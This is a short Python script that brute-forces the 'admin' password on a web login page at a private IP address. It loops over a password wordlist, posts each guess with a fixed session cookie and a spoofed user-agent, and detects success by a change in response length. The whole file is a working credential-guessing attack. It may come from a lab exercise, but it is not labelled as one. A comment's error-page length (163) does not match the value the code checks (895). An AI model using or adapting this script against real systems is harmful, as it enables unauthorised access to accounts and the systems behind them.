# coding=utf-8

import requests

# define the url and header
url = 'http://10.10.1.104:7600/iadmin/login.php'
header = {
    'Host': '10.10.1.104:7600',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Cookie': 'PHPSESSID=0lpbkm3rp9o4e9n438jmv994n7'
}

r = requests.Session()

for line in open("d://MD5pass.txt", 'r'):
	data = {
		'username': 'admin',
		'password': line.strip(),
		'dopost': "login"
	}
	req1 = r.post(url, params=data, headers=header)
	lenth = len(req1.content)
	# print req1.content
	if (lenth != 895):  #163是密码错误页面的长度
		print("the page's lenth is: %d   the password is: %s" % (lenth,line))
		print(req1.content)
		break
